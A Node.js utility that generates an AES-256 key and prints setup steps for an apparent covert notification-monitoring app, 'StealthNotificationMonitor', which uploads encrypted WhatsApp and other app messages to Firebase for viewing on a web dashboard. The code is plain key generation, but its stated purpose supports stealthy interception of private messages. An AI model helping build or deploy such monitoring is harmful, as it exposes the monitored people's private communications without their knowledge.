const crypto = require("crypto");

console.log("\n══════════════════════════════════════════════════════════════");
console.log("       🛡️  STEALTH NOTIFICATION AES-256 KEY GENERATOR         ");
console.log("══════════════════════════════════════════════════════════════\n");

// Generate 32 cryptographically secure random bytes (256 bits)
const rawBytes = crypto.randomBytes(32);
const base64Key = rawBytes.toString("base64");
const hexKey = rawBytes.toString("hex");

console.log("🔑 [1] Base64 Format (Recommended for Dashboard & Android):");
console.log(`   ${base64Key}\n`);

console.log("🔑 [2] 64-char Hex Format:");
console.log(`   ${hexKey}\n`);

console.log("══════════════════════════════════════════════════════════════");
console.log("📌 HOW TO USE THIS KEY:");
console.log("──────────────────────────────────────────────────────────────");
console.log("1. In Your Android App (StealthNotificationMonitor):");
console.log("   Set this key in your encryption helper (Java / Kotlin):");
console.log(`   val AES_KEY_BASE64 = "${base64Key}"`);
console.log("   (Android uses this to encrypt notifications before Firebase upload)\n");
console.log("2. In Your Web Dashboard (Key Vault Modal):");
console.log("   Click 'Key Vault (Locked)' in the top bar or messages page,");
console.log("   paste the Base64 key above, and click 'Unlock Vault'.");
console.log("   (Your browser will decrypt all WhatsApp & app messages in RAM!)\n");
console.log("⚠️ SECURITY NOTE: Never commit this key to Git or share it publicly!");
console.log("══════════════════════════════════════════════════════════════\n");

